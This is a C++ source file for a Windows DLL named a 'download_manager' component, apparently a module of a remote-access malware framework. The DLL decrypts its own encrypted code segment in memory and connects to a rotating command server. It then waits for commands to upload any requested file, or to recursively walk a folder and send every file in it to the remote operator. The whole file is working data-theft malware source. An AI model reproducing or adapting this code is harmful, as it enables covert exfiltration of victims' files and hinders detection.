#include "../Core/ComponentUtilities.h"
#include "../Core/PELoader.h"
#include "../Core/TcpShortDef.h"
#include "../Core/ChunkedTransaction.h"
#include <fstream>
#include <shellapi.h>
#include <sstream>
#include <memory>

//Components required defines
#define COMPONENT_TYPE ClientTypes::download_manager

#pragma section(segment_qdata, read)
store_variable(segment_qdata) QDATA_STORAGE storage { { 0 }, 1 };

HMODULE thisDll;
FILE_MUTEX_STRUCT thisLock;

int main();


BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
	switch (fdwReason) {
		case DLL_PROCESS_ATTACH: {
			thisDll = hinstDLL;
			srand(time(NULL));
			break;
		}
		case DLL_PROCESS_DETACH: {
			break;
		}
		case DLL_THREAD_ATTACH: {
			break;
		}
		case DLL_THREAD_DETACH: {
			break;
		}
	}

	return true;
}

void CALLBACK debug(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
	// Although debug will be exported only in debug version add this checkpoint

#ifdef  _DEBUG
	main();
#endif
}

//Error code should be 1000
//This is the signature for thread function
unsigned int WINAPI coInitComponent(LPVOID lpParameter) {
	DBG("Intro ....Locking");
	thisLock = getComponentLock(thisDll);

	if (!thisLock.locked) {
		DBG("Intro ....FAILED");
		FreeLibraryAndExitThread(thisDll, 1000);
		return 1000;	//Keep just in case
	}

	DBG("Intro ....Decrypting module in memory");

	if (!revertRelocatorChanges(thisDll)) {
		FreeLibraryAndExitThread(thisDll, 1000);
		return 1000;	//Keep just in case
	}
	if (!decryptSegmentInMemory(thisDll, segment_crypt)) {
		FreeLibraryAndExitThread(thisDll, 1000);
		return 1000;	//Keep just in case
	}
	if (!rebaseModuleSegment(thisDll)) {
		FreeLibraryAndExitThread(thisDll, 1000);
		return 1000;	//Keep just in case
	}

	DBG("Intro ....main() called");
	main();

	return 1;	//doesn't matter anymore. Just the first errors are important(for the loader)
}

//Returns version from data segment
DWORD getVersion() {
	return storage.version;
}

//Returns the component type
DWORD getType() {
	return (DWORD)COMPONENT_TYPE;
}


//Encripted side

// Returns the path suffixed with the * wildcard.
// The path returned will always end in "\*"
std::string getWildcardedPath(std::string mStringBuilder);
// Remove the * wildcard from the end of the string
void removeWildcardPath(std::string& mStringBuilder);

struct OPERATION_RESULT {
	bool success;
	uint64_t sent_files;
};


const char* ntstring = "?:\\";
std::array<char, 65000> file_buffer;

std::string getWildcardedPath(std::string mStringBuilder) {
	if (mStringBuilder[mStringBuilder.size() - 1] == '*') return mStringBuilder;
	if (mStringBuilder[mStringBuilder.size() - 1] == '\\') return mStringBuilder + "*";
	return mStringBuilder + "\\" + "*";
}
void removeWildcardPath(std::string& mStringBuilder) {
	if (mStringBuilder[mStringBuilder.size() - 1] == '*') mStringBuilder.resize(mStringBuilder.size() - 1);
}


bool sendFileStream(HorizonClient& client, std::string file_path, std::string header_arguments) {
	std::ifstream wantedFileHandle(file_path.c_str(), std::ios::binary);
	std::streampos fsize = 0;

	// fail() method is more general than good(). It checks for other conditions like fail bits
	if (wantedFileHandle.fail()) {
		wantedFileHandle.close();
		return false;
	}

	wantedFileHandle.seekg(0, wantedFileHandle.end);
	uint64_t length = wantedFileHandle.tellg();
	wantedFileHandle.seekg(0, wantedFileHandle.beg);

	if (!sendHeader(PacketDataTypes::download_file, length, header_arguments)) {
		wantedFileHandle.close();
		return false;
	}

	while (length > 0) {
		wantedFileHandle.read(file_buffer.data(), min(file_buffer.size(), length));

		if (!sendData(file_buffer.data(), min(file_buffer.size(), length))) {
			wantedFileHandle.close();
			return false;
		}

		length -= min(file_buffer.size(), length);
	}

	wantedFileHandle.close();
	return true;
}



store_code(segment_crypt) bool netloop(HorizonClient& client) {
	std::unique_ptr<PACKET_HEADER> header(new PACKET_HEADER);

	if (!recvHeader(header.get())) return false;

	switch ((PacketDataTypes)header->data_type) {
		case PacketDataTypes::flags_cancel_operation: {
			if (!sendHeader(PacketDataTypes::flags_cancelled_operation, 0, "")) return false;
			break;
		}
		case PacketDataTypes::download_file: {
			std::string requested_file_path = header->arguments;
			if (!sendFileStream(client, requested_file_path, requested_file_path)) {
				return false;
			}

			break;
		}

		case PacketDataTypes::download_folder: {
			WIN32_FIND_DATAA cbFoundFileStructure;
			std::queue<std::string> folders_queue;
			HANDLE lpFirstFileHandle = nullptr;
			std::string root_folder_path = header->arguments;
			TOKEN_KEY end_token;

			root_folder_path = getWildcardedPath(root_folder_path);
			folders_queue.push(root_folder_path);

			if (!recvData(end_token.data(), end_token.size())) return false;

			do {
				std::string current_folder = folders_queue.front();
				std::string current_folder_path = current_folder;
				HANDLE lpFirstFileHandle = FindFirstFileA(current_folder.c_str(), &cbFoundFileStructure);

				folders_queue.pop();
				if (lpFirstFileHandle == INVALID_HANDLE_VALUE) continue;

				removeWildcardPath(current_folder_path);

				do {
					std::string found_file_path = current_folder_path + std::string(cbFoundFileStructure.cFileName);

					//Filter out parent folders and current folder
					if (strcmp(cbFoundFileStructure.cFileName, ".") == 0 || strcmp(cbFoundFileStructure.cFileName, "..") == 0) {
						continue;
					}

					//Add discovered folder back to queue
					if (cbFoundFileStructure.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
						folders_queue.push(getWildcardedPath(found_file_path));
						continue;
					}

					//Send found file
					sendFileStream(client, found_file_path, found_file_path);


					//Check if operation is cancelled
					if (client.dataAvailable(0)) {
						FindClose(lpFirstFileHandle);

						if (!recvHeader(header.get())) {
							return false;
						}
						if ((PacketDataTypes)header->data_type == PacketDataTypes::flags_cancel_operation) {
							client.setToken(end_token);
							if (!sendHeader(PacketDataTypes::download_folder_end, 0, "")) return false;

							return true;
						}

						//Unknown command
						sendError("Unknown command");
						return false;
					}

				} while (FindNextFileA(lpFirstFileHandle, &cbFoundFileStructure));

				//Close opened handle
				FindClose(lpFirstFileHandle);

			} while (!folders_queue.empty());

			client.setToken(end_token);
			if (!sendHeader(PacketDataTypes::download_folder_end, 0, "")) return false;

			break;
		}
	}

	return true;
}

void callback_userdescriptorChanged(const USERDESCRIPTOR* new_user) {
	updateStoredDescriptor(new_user);
}

store_code(segment_crypt) int main() {
	while (true) {
		try {
			DBG("Connecting");

			std::unique_ptr<USERDESCRIPTOR> user = loadStoredDescriptor(getVersion(), COMPONENT_TYPE);
			HorizonClient client(getNextDNS(), user.get(), thisDll, callback_userdescriptorChanged);

			DBG("Connected");

			if (!client.authentificate(__LINE__)) {
				DBG("Could not authentificate");
				continue;
			}

			// Message pump
			while (true) {
				if (!netloop(client)) break;
			}
			client.closeClient();

			DBG("Connection ended");

		} catch (std::exception ex) {
			DBG("Exeption");
			DBG(ex.what());
			Sleep(1000);
		}
	}

	return 0;
}